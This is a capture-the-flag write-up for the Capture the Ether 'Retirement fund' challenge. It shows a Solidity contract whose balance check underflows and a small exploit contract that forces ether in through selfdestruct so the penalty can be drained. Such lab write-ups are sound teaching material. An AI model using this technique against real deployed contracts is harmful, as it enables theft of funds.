# Retirement fund

## Required Concepts

This contract challenge does almost everything right. The flaw is that this retirement fund does not account for ether deposits that are not the result of a transaction. According to the [Solidity documentation](https://solidity.readthedocs.io/en/v0.4.24/security-considerations.html?highlight=selfdestruct#sending-and-receiving-ether), it is possible to force ```ether``` to an account without initiating a transaction in one of two ways: mining, or calling the ```selfdestruct()``` function on a contract with a pre-existing ether balance.

## Challenge
Source: https://capturetheether.com/challenges/math/retirement-fund/

>This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.
>
>I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).
>
>I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

```
pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}
```

## Solution

The solution to this puzzle involves very little actual Solidity:
```
pragma solidity ^0.4.24;

// Ability to force send ether to a contract without a transaction
// This exploits the 'withdrawn' variable to be greater than zero

contract explode {

    constructor() public payable {
        require(msg.value == 1 ether);
    }

    function blowUp(address _fuse) public {
        selfdestruct(_fuse);
    }
}
```

Now you can collect the Challenge contract balance. Make a call to the ```collectPenalty``` function. This will transfer the entire balance back to your address.
